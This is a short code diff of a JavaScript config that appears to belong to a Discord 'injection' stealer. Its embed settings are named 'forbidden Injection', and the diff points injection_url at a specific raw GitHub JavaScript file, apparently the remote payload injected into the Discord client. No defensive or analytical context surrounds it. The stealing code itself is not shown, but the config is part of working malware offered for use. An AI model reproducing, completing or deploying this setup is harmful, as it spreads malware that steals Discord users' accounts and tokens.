@@ -14,7 +14,7 @@ const config = {
   embed_name: 'forbidden Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1281096963902935081/1297559427750297680/2c975b43bb8c83a5ba774360f5982b64.webp?ex=67165de3&is=67150c63&hm=4e68fb10a52645a680a7ac1b986e75f06337865ae92cf6d926b3ccf05032251f&?size=4096'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/forbiddenangel/', 
+  injection_url: 'https://raw.githubusercontent.com/forbiddenangel/nothinghere/refs/heads/main/justangel.js', 
   /**
    
    **/
